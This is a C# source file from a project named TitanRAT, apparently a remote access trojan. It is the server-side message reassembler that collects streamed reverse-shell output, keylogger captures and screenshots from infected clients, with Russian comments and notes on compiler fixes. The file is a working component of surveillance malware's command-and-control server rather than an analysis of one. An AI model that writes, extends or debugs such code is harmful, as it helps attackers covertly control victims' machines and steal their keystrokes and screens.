// Server/MessageReassembler.cs — v8.1: Fixed CS1503 + Prompt Detection
using System;
using System.Collections.Concurrent;
using System.Linq;
using System.Text.RegularExpressions;
using System.Threading;

namespace TitanRAT.Server
{
    public class MessageReassembler
    {
        private record StreamKey(string ClientId, string Prefix);
        private readonly ConcurrentDictionary<StreamKey, (string Buffer, DateTime Last)> _streams = new();
        private readonly Timer _cleanupTimer;
        private const int TIMEOUT_MS = 10000; // 10 секунд страховочного таймаута

        public MessageReassembler()
        {
            _cleanupTimer = new Timer(CleanupStale, null, TimeSpan.FromSeconds(15), TimeSpan.FromSeconds(15));
        }

        public string? Process(string clientId, string raw)
        {
            // 1. Чанкированный формат (старый)
            var chunkMatch = Regex.Match(raw, @"^(?<Prefix>[A-Z_]+)#(?<Seq>\d+)/(?<Total>\d+):(?<Data>.*)$");
            if (chunkMatch.Success) return ProcessChunked(clientId, chunkMatch);

            // 2. Потоковый формат: PREFIX:DATA
            var colonIndex = raw.IndexOf(':');
            if (colonIndex > 0)
            {
                var prefix = raw.Substring(0, colonIndex);
                var data = raw.Substring(colonIndex + 1);

                // Агрегируем только вывод шелла/кейлоггера/скриншотов
                if (prefix == "SHELL_OUT" || prefix.StartsWith("KEYLOG") || prefix.StartsWith("SCREENSHOT"))
                {
                    return Aggregate(clientId, prefix, data);
                }

                // Контрольное сообщение (pong, MODULE_*, QUEUED) -> сбрасываем всё
                FlushAll(clientId);
                return raw;
            }

            // 3. "Голые" данные без префикса: добавляем к активному шелл-потоку
            var shellKey = new StreamKey(clientId, "SHELL_OUT");
            if (_streams.TryGetValue(shellKey, out var active) && 
                (DateTime.UtcNow - active.Last).TotalMilliseconds < TIMEOUT_MS)
            {
                return Aggregate(clientId, "SHELL_OUT", raw);
            }

            // 4. Неизвестный формат -> сброс и прямой вывод
            FlushAll(clientId);
            return raw;
        }

        private string? Aggregate(string clientId, string prefix, string data)
        {
            var key = new StreamKey(clientId, prefix);
            var now = DateTime.UtcNow;

            if (_streams.TryGetValue(key, out var existing))
            {
                // Проверка таймаута на существующем буфере
                if ((now - existing.Last).TotalMilliseconds >= TIMEOUT_MS)
                {
                    string result = $"{prefix}:{existing.Buffer.Trim()}";
                    _streams[key] = (data, now); // Начинаем новый
                    return result;
                }

                // Добавляем данные
                string newBuffer = existing.Buffer + "\n" + data;
                _streams[key] = (newBuffer, now);

                // ← ТРИГГЕР: Ищем промпт cmd.exe в конце буфера
                if (Regex.IsMatch(newBuffer, @"[A-Z]:\\.*>[\s]*$"))
                {
                    _streams.TryRemove(key, out var _); // ← FIX: explicit type
                    return $"{prefix}:{newBuffer.Trim()}";
                }

                return null; // Продолжаем агрегацию
            }
            else
            {
                // Новый поток
                _streams[key] = (data, now);

                // Проверяем промпт сразу (если весь вывод пришёл одним пакетом)
                if (Regex.IsMatch(data, @"[A-Z]:\\.*>[\s]*$"))
                {
                    _streams.TryRemove(key, out var _); // ← FIX: explicit type
                    return $"{prefix}:{data.Trim()}";
                }

                return null;
            }
        }

        public string? FlushStream(string clientId, string prefix)
        {
            var key = new StreamKey(clientId, prefix);
            if (_streams.TryRemove(key, out var existing) && !string.IsNullOrEmpty(existing.Buffer))
                return $"{prefix}:{existing.Buffer.Trim()}";
            return null;
        }

        private void FlushAll(string clientId)
        {
            var keys = _streams.Keys.Where(k => k.ClientId == clientId).ToList();
            foreach (var key in keys)
            {
                _streams.TryRemove(key, out var _); // ← FIX: explicit type
            }
        }

        private string? ProcessChunked(string clientId, Match match)
        {
            // Упрощённая отдача для чанков
            return $"{match.Groups["Prefix"].Value}:{match.Groups["Data"].Value}";
        }

        private void CleanupStale(object? _)
        {
            var now = DateTime.UtcNow;
            var stale = _streams.Where(kvp => (now - kvp.Value.Last).TotalMilliseconds > TIMEOUT_MS * 2)
                                .Select(kvp => kvp.Key).ToList();
            foreach (var key in stale)
            {
                // ← FIX: явный тип для кортежа
                _streams.TryRemove(key, out (string Buffer, DateTime Last) _);
            }
        }
    }
}